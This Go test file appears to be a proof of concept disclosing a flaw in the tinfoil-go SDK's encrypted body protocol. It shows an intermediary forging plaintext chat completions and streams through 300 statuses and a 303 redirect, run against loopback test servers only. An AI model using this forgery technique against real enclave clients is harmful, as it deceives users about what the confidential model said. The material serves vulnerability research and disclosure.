package tinfoil

// LOCAL PoC: an intermediary that cannot decrypt EHBP traffic (no HPKE private
// key) makes the default-mode Go SDK accept an attacker-written plaintext body
// as the enclave's chat completion.
//
// Everything below runs against loopback httptest servers only.

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/stretchr/testify/require"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
)

const forgedCompletion = `{"id":"chatcmpl-forged","object":"chat.completion","created":1,"model":"llama3-3-70b",` +
	`"choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"FORGED BY INTERMEDIARY"}}]}`

const forgedSSE = "data: {\"id\":\"chatcmpl-forged\",\"object\":\"chat.completion.chunk\",\"created\":1,\"model\":\"m\"," +
	"\"choices\":[{\"index\":0,\"delta\":{\"role\":\"assistant\",\"content\":\"FORGED STREAM\"},\"finish_reason\":\"stop\"}]}\n\n" +
	"data: [DONE]\n\n"

// pocLog records what the intermediary observed.
type pocLog struct {
	mu    sync.Mutex
	lines []string
}

func (l *pocLog) add(s string) { l.mu.Lock(); l.lines = append(l.lines, s); l.mu.Unlock() }
func (l *pocLog) all() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return append([]string(nil), l.lines...)
}

// intermediary is a TLS-terminating party on the path to the enclave (a
// WithBaseURL proxy, or a load balancer holding a WebPKI certificate for the
// enclave hostname). It never sees the enclave's HPKE private key.
func intermediary(t *testing.T, mode string, honestEnclave http.Handler, log *pocLog) *httptest.Server {
	return httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		sealed := r.Header.Get("Ehbp-Encapsulated-Key") != ""
		log.add(r.Method + " " + r.URL.RequestURI() + " sealed=" + map[bool]string{true: "yes", false: "no"}[sealed] +
			" bodyHasPlaintextPrompt=" + map[bool]string{true: "yes", false: "no"}[strings.Contains(string(body), "secret prompt")])
		switch mode {
		case "honest":
			// Forward to the real enclave (EHBP middleware holds the private key).
			r2 := r.Clone(r.Context())
			r2.Body = io.NopCloser(strings.NewReader(string(body)))
			r2.ContentLength = int64(len(body))
			honestEnclave.ServeHTTP(w, r2)
		case "control-200":
			// Plain body substitution on a 2xx: EHBP must reject this.
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, forgedCompletion)
		case "status-300":
			// Non-2xx (but < 400) status with a plaintext body and no nonce.
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusMultipleChoices)
			io.WriteString(w, forgedCompletion)
		case "status-300-sse":
			w.Header().Set("Content-Type", "text/event-stream")
			w.WriteHeader(http.StatusMultipleChoices)
			io.WriteString(w, forgedSSE)
		case "redirect-303":
			// Turn the sealed POST into a bodyless GET, whose response EHBP
			// never decrypts.
			if r.Method == http.MethodPost {
				w.Header().Set("Location", r.URL.Path)
				w.WriteHeader(http.StatusSeeOther)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			io.WriteString(w, forgedCompletion)
		default:
			t.Errorf("unknown mode %q", mode)
		}
	}))
}

// trustIntermediary makes http.DefaultTransport (which the EHBP transport
// sends through) trust the intermediary's certificate and route the enclave
// hostname to it, emulating a party that holds a valid WebPKI certificate.
func trustIntermediary(t *testing.T, srv *httptest.Server) {
	dt := http.DefaultTransport.(*http.Transport)
	oldTLS, oldDial := dt.TLSClientConfig, dt.DialContext
	pool := x509.NewCertPool()
	pool.AddCert(srv.Certificate())
	dt.TLSClientConfig = &tls.Config{RootCAs: pool}
	addr := srv.Listener.Addr().String()
	dt.DialContext = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}
	dt.CloseIdleConnections()
	t.Cleanup(func() {
		dt.TLSClientConfig, dt.DialContext = oldTLS, oldDial
		dt.CloseIdleConnections()
	})
}

func pocClient(t *testing.T, enclaveHost, hpkeKeyHex, baseURL string) *Client {
	verified := func() (*verify.Verification, error) {
		return &verify.Verification{
			ConfigRepo: "tinfoilsh/confidential-model-router",
			CryptoMaterial: []document.CryptoMaterialItem{
				{ID: document.CryptoMaterialIDTLS, Format: document.KeySPKIFPSHA256V1Format, Data: strings.Repeat("ab", 32)},
				{ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: hpkeKeyHex},
			},
			FreshnessExpiresAt: time.Now().Add(time.Hour),
		}, nil
	}
	handle, err := enclave.PoCHandleWithVerification(enclaveHost, "tinfoilsh/confidential-model-router", verified)
	require.NoError(t, err)
	// Same constructor NewClientWithOptions ends in, default EHBP mode.
	c, err := createClientFromHandle(handle, TransportEHBP, baseURL, "poc-user-cache-secret",
		option.WithAPIKey("sk-poc"), option.WithMaxRetries(0))
	require.NoError(t, err)
	return c
}

func chatParams() openai.ChatCompletionNewParams {
	return openai.ChatCompletionNewParams{
		Model:    "llama3-3-70b",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("my secret prompt")},
	}
}

func TestPoC_EHBPPlaintextResponseForgery(t *testing.T) {
	enclaveID, err := ehbpidentity.NewIdentity()
	require.NoError(t, err)
	honestEnclave := enclaveID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, strings.Replace(forgedCompletion, "FORGED BY INTERMEDIARY", "REAL ENCLAVE ANSWER", 1))
	}))

	for _, topology := range []string{"proxy-baseURL", "direct-enclave-hostname"} {
		for _, mode := range []string{"honest", "control-200", "status-300", "redirect-303"} {
			t.Run(topology+"/"+mode, func(t *testing.T) {
				log := &pocLog{}
				srv := intermediary(t, mode, honestEnclave, log)
				defer srv.Close()
				trustIntermediary(t, srv)
				baseURL := ""
				if topology == "proxy-baseURL" {
					baseURL = "https://proxy.example.com/v1/"
				}
				c := pocClient(t, "enclave.example.com", enclaveID.MarshalPublicKeyHex(), baseURL)

				resp, err := c.Chat.Completions.New(context.Background(), chatParams())
				for _, l := range log.all() {
					t.Logf("intermediary saw: %s", l)
				}
				if err != nil {
					t.Logf("RESULT: SDK returned error: %v", err)
				} else {
					t.Logf("RESULT: SDK returned completion content=%q", resp.Choices[0].Message.Content)
				}
				switch mode {
				case "honest":
					require.NoError(t, err)
					require.Equal(t, "REAL ENCLAVE ANSWER", resp.Choices[0].Message.Content)
				case "control-200":
					require.Error(t, err, "EHBP rejects a 2xx plaintext substitution")
				default:
					require.NoError(t, err)
					require.Equal(t, "FORGED BY INTERMEDIARY", resp.Choices[0].Message.Content,
						"attacker-written plaintext accepted as the enclave's answer")
				}
			})
		}
	}
}

func TestPoC_EHBPPlaintextStreamForgery(t *testing.T) {
	enclaveID, err := ehbpidentity.NewIdentity()
	require.NoError(t, err)
	log := &pocLog{}
	srv := intermediary(t, "status-300-sse", nil, log)
	defer srv.Close()
	trustIntermediary(t, srv)
	c := pocClient(t, "enclave.example.com", enclaveID.MarshalPublicKeyHex(), "")

	stream := c.Chat.Completions.NewStreaming(context.Background(), chatParams())
	defer stream.Close()
	var content string
	for stream.Next() {
		for _, ch := range stream.Current().Choices {
			content += ch.Delta.Content
		}
	}
	for _, l := range log.all() {
		t.Logf("intermediary saw: %s", l)
	}
	t.Logf("RESULT: stream err=%v content=%q", stream.Err(), content)
	require.NoError(t, stream.Err())
	require.Equal(t, "FORGED STREAM", content)
}
